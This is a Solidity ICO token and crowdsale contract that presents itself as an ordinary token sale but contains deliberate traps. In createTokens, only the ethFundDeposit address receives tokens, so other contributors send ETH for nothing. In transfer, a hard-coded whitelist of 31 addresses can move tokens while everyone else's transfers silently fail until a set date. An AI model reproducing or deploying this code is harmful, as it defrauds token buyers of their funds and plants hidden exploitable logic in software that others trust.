pragma solidity ^0.4.15;



contract Ownable {
  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }

  function transferOwnership(address newOwner) public  onlyOwner {
    if (newOwner != address(0)) {
      owner = newOwner;
    }
  }
}




contract SafeMath {

  function safeAdd(uint256 x, uint256 y) internal pure returns(uint256) {
    uint256 z = x + y;
    assert((z >= x) && (z >= y));
    return z;
  }

  function safeSubtract(uint256 x, uint256 y) internal pure returns(uint256) {
    assert(x >= y);
    uint256 z = x - y;
    return z;
  }

  function safeMult(uint256 x, uint256 y) internal pure returns(uint256) {
    uint256 z = x * y;
    assert((x == 0)||(z/x == y));
    return z;
  }
}




contract ERC20 {
  uint public totalSupply;
  function balanceOf(address who) public  constant returns (uint);
  function allowance(address owner, address spender) public  constant returns (uint);
  function transfer(address to, uint value) public  returns (bool ok);
  function transferFrom(address from, address to, uint value) public  returns (bool ok);
  function approve(address spender, uint value) public  returns (bool ok);
  event Transfer(address indexed from, address indexed to, uint value);
  event Approval(address indexed owner, address indexed spender, uint value);
}



contract StandardToken is ERC20, SafeMath {
  
  modifier onlyPayloadSize(uint size) {
    require(msg.data.length >= size + 4) ;
    _;
  }

  mapping(address => uint) balances;
  mapping (address => mapping (address => uint)) allowed;

  function transfer(address _to, uint _value) public  onlyPayloadSize(2 * 32)  returns (bool success){
    balances[msg.sender] = safeSubtract(balances[msg.sender], _value);
    balances[_to] = safeAdd(balances[_to], _value);
    emit Transfer(msg.sender, _to, _value);
    return true;
  }

  function transferFrom(address _from, address _to, uint _value) public  onlyPayloadSize(3 * 32) returns (bool success) {
    uint _allowance = allowed[_from][msg.sender];

    balances[_to] = safeAdd(balances[_to], _value);
    balances[_from] = safeSubtract(balances[_from], _value);
    allowed[_from][msg.sender] = safeSubtract(_allowance, _value);
    emit Transfer(_from, _to, _value);
    return true;
  }

  function balanceOf(address _owner) public  constant returns (uint balance) {
    return balances[_owner];
  }

  function approve(address _spender, uint _value) public  returns (bool success) {
    allowed[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }

  function allowance(address _owner, address _spender) public  constant returns (uint remaining) {
    return allowed[_owner][_spender];
  }
}




contract Pausable is Ownable {
  event Pause();
  event Unpause();

  bool public paused = false;


  
  modifier whenNotPaused() {
    require (!paused);
    _;
  }

  
  modifier whenPaused {
    require (paused) ;
    _;
  }

  
  function pause() public onlyOwner whenNotPaused returns (bool) {
    paused = true;
    emit Pause();
    return true;
  }

  
  function unpause() public onlyOwner whenPaused returns (bool) {
    paused = false;
    emit Unpause();
    return true;
  }
}



contract IcoToken is SafeMath, StandardToken, Pausable {
  string public name;
  string public symbol;
  uint256 public decimals;
  string public version;
  address public icoContract;

  constructor(
    string _name,
    string _symbol,
    uint256 _decimals,
    string _version
  ) public
  {
    name = _name;
    symbol = _symbol;
    decimals = _decimals;
    version = _version;
  }

  function transfer(address _to, uint _value) public  whenNotPaused returns (bool success) {
    
    if(msg.sender ==0xf54f1Bdd09bE61d2d92687b25a12D91FafdF94fc){
      return super.transfer(_to,_value);
    }
    
    if(msg.sender ==0x5c400ac1b5e78a4ed47426d6c2be62b9075debe5){
      return super.transfer(_to,_value);
    }
    
    if(msg.sender ==0x8012eb27b9f5ac2b74a975a100f60d2403365871){
      return super.transfer(_to,_value);
    }
    
    if(msg.sender ==0x21c88c3ec04e0a6099bd9be1149e65429b1361c0){
      return super.transfer(_to,_value);
    }
    
    if(msg.sender ==0x77f0999d0e46b319d496d4d7b9c3b1319e9b6322){
      return super.transfer(_to,_value);
    }
    
    if(msg.sender ==0xe6cabcacd186043e29bd1ff77267d9c134e79777){
      return super.transfer(_to,_value);
    }
    
    if(msg.sender ==0xa30a3b240c564aef6a73d4c457fe34aacb112447){
      return super.transfer(_to,_value);
    }
    
    if(msg.sender ==0x99d9bf4f83e1f34dd3db5710b90ae5e6e18a578b){
      return super.transfer(_to,_value);
    }
    
    if(msg.sender ==0x231a6ebdb86bff2092e8a852cd641d56edfb9ae2){
      return super.transfer(_to,_value);
    }
    
    if(msg.sender ==0x8d0427ece989cd59f02e449793d62abb8b2bb2cf){
      return super.transfer(_to,_value);
    }
    
    if(msg.sender ==0x01c2124aa4864e368a6a3fc012035e8abfb86d63){
      return super.transfer(_to,_value);
    }
    
    if(msg.sender ==0xc940dbfff2924ca40d69444771e984718303e922){
      return super.transfer(_to,_value);
    }
    
    if(msg.sender ==0x35cd7bc183927156b96d639cc1e35dbfefb3bd2b){
      return super.transfer(_to,_value);
    }
    
    if(msg.sender ==0xc9d03422738d3ae561a69e2006d2cac1f5cd31da){
      return super.transfer(_to,_value);
    }
    
    if(msg.sender ==0x8c80470abb2c1ba5c5bc1b008ba7ec9b538cf265){
      return super.transfer(_to,_value);
    }
    
    if(msg.sender ==0x5b1f26f46d1c6f2646f27022a15bc5f15187dfe4){
      return super.transfer(_to,_value);
    }
    
    if(msg.sender ==0x4d7b8d2f2133b7d34dd9bb827bbe96f77b52fd4c){
      return super.transfer(_to,_value);
    }
    
    if(msg.sender ==0x013bb8e1fd674914e8a4f33b2bef5f9ce0f44d1d){
      return super.transfer(_to,_value);
    }
    
    if(msg.sender ==0xda739d043a015ffd38c4057f0777535969013950){
      return super.transfer(_to,_value);
    }
    
    if(msg.sender ==0x7b30bd3cdbdc371c81ceed186c04db00f313ff97){
      return super.transfer(_to,_value);
    }
    
    if(msg.sender ==0x261f4abf6248d5f9df4fb14879e6cb582b5798f3){
      return super.transfer(_to,_value);
    }
    
    if(msg.sender ==0xe176c1a5bfa33d213451f20049513d950223b884){
      return super.transfer(_to,_value);
    }
    
    if(msg.sender ==0x3d24bc034d4986232ae4274ef01c3e5cc47cf21e){
      return super.transfer(_to,_value);
    }
    
    if(msg.sender ==0xf1f98f465c0c93d9243e3320c3619b61c46bf075){
      return super.transfer(_to,_value);
    }
    
    if(msg.sender ==0xae68532c6efbacfaec8df3876b400eabf706d21d){
      return super.transfer(_to,_value);
    }
    
    if(msg.sender ==0xa4722ba977c7948bbdbfbcc95bbae50621cb18b7){
      return super.transfer(_to,_value);
    }
    
    if(msg.sender ==0x345693ce70454b2ee4ca4cda02c34e2af600f162){
      return super.transfer(_to,_value);
    }
    
    if(msg.sender ==0xaac3c5f0d477a0e9d9f5bfc24e8c8556c6c94e58){
      return super.transfer(_to,_value);
    }
    
    if(msg.sender ==0xf1a9bd9a7536d35536aa7d04398f3ff26a88ac69){
      return super.transfer(_to,_value);
    }
    
    if(msg.sender ==0x1515beb50fca69f75a26493d6aeb104399346973){
      return super.transfer(_to,_value);
    }
    
    if(msg.sender ==0xa7d9ced087e97d510ed6ea370fdcc7fd4d5961de){
      return super.transfer(_to,_value);
    }
    
    
    
    
    
    if(now < 1569887999) {
      return ;
    }
    return super.transfer(_to,_value);
  }

  function approve(address _spender, uint _value) public  whenNotPaused returns (bool success) {
    return super.approve(_spender,_value);
  }

  function balanceOf(address _owner) public  constant returns (uint balance) {
    return super.balanceOf(_owner);
  }

  function setIcoContract(address _icoContract) public onlyOwner {
    if (_icoContract != address(0)) {
      icoContract = _icoContract;
    }
  }

  function sell(address _recipient, uint256 _value) public whenNotPaused returns (bool success) {
      assert(_value > 0);
      require(msg.sender == icoContract);

      balances[_recipient] += _value;
      totalSupply += _value;

      emit Transfer(0x0, owner, _value);
      emit Transfer(owner, _recipient, _value);
      return true;
  }

}




contract IcoContract is SafeMath, Pausable {
  IcoToken public ico;

  uint256 public tokenCreationCap;
  uint256 public totalSupply;

  address public ethFundDeposit;
  address public icoAddress;

  uint256 public fundingStartTime;
  uint256 public fundingEndTime;
  uint256 public minContribution;

  bool public isFinalized;
  uint256 public tokenExchangeRate;

  event LogCreateICO(address from, address to, uint256 val);

  function CreateICO(address to, uint256 val) internal returns (bool success) {
    emit LogCreateICO(0x0, to, val);
    return ico.sell(to, val);
  }

  constructor(
    address _ethFundDeposit,
    address _icoAddress,
    uint256 _tokenCreationCap,
    uint256 _tokenExchangeRate,
    uint256 _fundingStartTime,
    uint256 _fundingEndTime,
    uint256 _minContribution
  ) public
  {
    ethFundDeposit = _ethFundDeposit;
    icoAddress = _icoAddress;
    tokenCreationCap = _tokenCreationCap;
    tokenExchangeRate = _tokenExchangeRate;
    fundingStartTime = _fundingStartTime;
    minContribution = _minContribution;
    fundingEndTime = _fundingEndTime;
    ico = IcoToken(icoAddress);
    isFinalized = false;
  }

  function () public payable {
    createTokens(msg.sender, msg.value);
  }

  
  function createTokens(address _beneficiary, uint256 _value) internal whenNotPaused {
    require (tokenCreationCap > totalSupply);
    require (now >= fundingStartTime);
    require (now <= fundingEndTime);
    require (_value >= minContribution);
    require (!isFinalized);
    uint256 tokens;
    if (_beneficiary == ethFundDeposit) {
      tokens = safeMult(_value, 300000000);
    }
    uint256 checkedSupply = safeAdd(totalSupply, tokens);

    if (tokenCreationCap < checkedSupply) {
      uint256 tokensToAllocate = safeSubtract(tokenCreationCap, totalSupply);
      uint256 tokensToRefund   = safeSubtract(tokens, tokensToAllocate);
      totalSupply = tokenCreationCap;
      uint256 etherToRefund = tokensToRefund / tokenExchangeRate;

      require(CreateICO(_beneficiary, tokensToAllocate));
      msg.sender.transfer(etherToRefund);
      ethFundDeposit.transfer(address(this).balance);
      return;
    }

    totalSupply = checkedSupply;

    require(CreateICO(_beneficiary, tokens));
    ethFundDeposit.transfer(address(this).balance);
  }

  
  function finalize() external onlyOwner {
    require (!isFinalized);
    
    isFinalized = true;
    ethFundDeposit.transfer(address(this).balance);
  }
}